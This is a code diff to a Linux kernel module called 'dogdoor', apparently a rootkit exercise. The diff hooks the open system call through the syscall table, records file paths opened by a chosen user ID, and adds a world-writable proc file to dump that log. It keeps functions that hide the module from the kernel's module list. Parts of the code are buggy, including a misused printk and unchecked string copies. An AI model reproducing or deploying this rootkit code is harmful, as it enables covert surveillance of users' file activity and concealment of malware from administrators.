@@ -18,21 +18,25 @@ struct list_head* p;
 int index=0;
 void ** sctable ;
 int connect = 1;
-int uid=0;
+int uid=-31;
+char filepath[10][512];
+int top =0;
 
 asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
 
 asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
 {
-	char fname[256] ;
-	int result, result2;
+	char fname[512] ;
+	copy_from_user(fname, filename,512) ;
 
+	if(current->cred->uid.val == uid){
+		top++;
+		if(top>=10)	top = top%10;
+		filepath[top][0] = '\0';
+		strcpy(&filepath[top][0],fname);
+	}
+	
 
-	copy_from_user(fname, filename, 256) ;
-	
-	
-	
-	
 	return orig_sys_open(filename, flags, mode) ;
 }
 
@@ -46,27 +50,6 @@ static
 int dogdoor_proc_release(struct inode *inode, struct file *file) {
 	return 0 ;
 }
-
-
-static
-void show_module(void){
-	if(connect==0){
-		list_add(&THIS_MODULE->list, p); 
-		connect = 1;
-		printk("connect\n");
-	}	
-	return;
-}
-
-void hide_module(void){
-	if(connect==1){
-		list_del_init(&THIS_MODULE->list); 
-		connect = 0;
-		printk("disconnect\n");
-	}	
-	return;
-}
-	
 static
 ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
 {
@@ -82,6 +65,43 @@ ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, lof
 	*offset = *offset + toread ;
 
 	return toread ;
+}
+
+
+
+static
+void show_module(void){
+	if(connect==0){
+		list_add(&THIS_MODULE->list, p); 
+		connect = 1;
+		printk("connect\n");
+	}	
+	return;
+}
+static
+void hide_module(void){
+	if(connect==1){
+		list_del_init(&THIS_MODULE->list); 
+		connect = 0;
+		printk("disconnect\n");
+	}	
+	return;
+}
+
+
+
+	
+static
+void show_log(void) 
+{
+	char buf[256] ;
+	ssize_t toread ;
+	int i=0;
+	for(i=0; i<10; i++){
+		printk(buf, "path : %s\n", &filepath[i][0]) ;
+	}
+
+	
 }
 
 
@@ -109,6 +129,9 @@ ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t si
 	if(index==1){
 		sscanf(buf+1, "%d",&uid);
 		printk("uid = %d\n",uid);
+	}
+	else if(index==2){
+		show_log();
 	}	
 	if(index==5){
 		hide_module();
@@ -137,6 +160,7 @@ int __init dogdoor_init(void) {
 	unsigned int level ; 
 	pte_t * pte ;
 	proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &dogdoor_fops) ;
+	proc_create("dogdoor_log", S_IRUGO | S_IWUGO, NULL, &dogdoor_fops) ;
   	modules_list = THIS_MODULE->list;
 	p = (&modules_list)->prev;
 	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;
@@ -155,7 +179,7 @@ void __exit dogdoor_exit(void) {
 	unsigned int level ;
 	pte_t * pte ;
 	remove_proc_entry("dogdoor", NULL) ;
-
+	remove_proc_entry("dogdoor_log", NULL) ;
 	sctable[__NR_open] = orig_sys_open ;
 	pte = lookup_address((unsigned long) sctable, &level) ;
 	pte->pte = pte->pte &~ _PAGE_RW ;
